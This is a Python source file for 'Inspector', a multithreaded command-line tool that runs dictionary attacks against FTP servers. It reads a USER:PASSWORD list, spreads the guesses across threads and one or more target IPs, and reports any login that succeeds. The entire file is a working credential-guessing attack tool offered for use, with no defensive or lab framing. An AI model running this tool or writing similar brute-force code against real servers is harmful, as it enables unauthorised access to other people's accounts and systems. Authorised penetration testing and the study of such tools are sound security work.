#!/usr/bin/env python3
#github.com/intrackeable
import ftplib
import os
import threading
import argparse
import pyfiglet
from datetime import datetime
from colorama import Fore, Style
from ftplib import FTP

global green, blue, reset, red

green = Fore.GREEN
blue = Fore.CYAN 
reset = Style.RESET_ALL
red = Fore.RED

def split_list(number,user_pass):
    main_list = [user_pass[i::number] for i in range(number)]
    return main_list

def display_banner():
    os.system('clear')
    draw = pyfiglet.figlet_format('Inspector',font='slant')
    print(blue + draw + '\nCLI for perform dictionary attacks in FTP servers.')

def get_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    return current_time

def options():
    parser = argparse.ArgumentParser()
    parser.add_argument('-F',help='File with credentials [USER:PASSWORD] format',type=str,dest='user_pass')
    parser.add_argument('-T',help='Number of threads [DEFAULT 2]',type=int,dest='threads',default=2)
    parser.add_argument('-S',help='FTP server IP [Multiple targets allowed]',dest='multiple',type=str,nargs='*')
    flags = parser.parse_args()
    return flags.user_pass, flags.threads, flags.multiple

def open_file(file_list):
    with open (file_list,'r') as file:
        credentials = file.read().split('\n')
    credentials = [x for x in credentials if x != '']
    return credentials

def test_credentials(server,sublist):
    for i in sublist:
        creds = i.split(':')
        try:
            ftp = FTP(server)
            ftp.login(creds[0],creds[1])
            ftp.quit()
            print('{}FOUND CREDENTIALS {} {} {} {}'.format(green,server,creds[0],creds[1],get_time()))
            exit()
        except ftplib.error_perm:
            print('{}Invalid {} {} {} {}'.format(blue,server,creds[0],creds[1],get_time()))

def start_threads(main_list,server):
    try:
        for i in main_list:
            process = threading.Thread(target=test_credentials, args=(server,i))
            process.start()
    except KeyboardInterrupt:
        print(red + 'CLOSING PROGRAM')
        exit()

def multiple_servers(main_list,server_list):
    for x in server_list:
        main_process = threading.Thread(target=start_threads, args=(main_list,x))
        main_process.start()

def main():
    display_banner()
    try:
        user_pass, threads, server = options()
        if user_pass and server:
            user_pass_list = open_file(user_pass)
            main_list = split_list(threads,user_pass_list)
            multiple_servers(main_list,server)
        else:
            print(red + 'Please use -H to see all options')
    except KeyboardInterrupt:
        print(red + 'CLOSING PROGRAM')
    finally:
        exit()

if __name__ == '__main__':
    main()

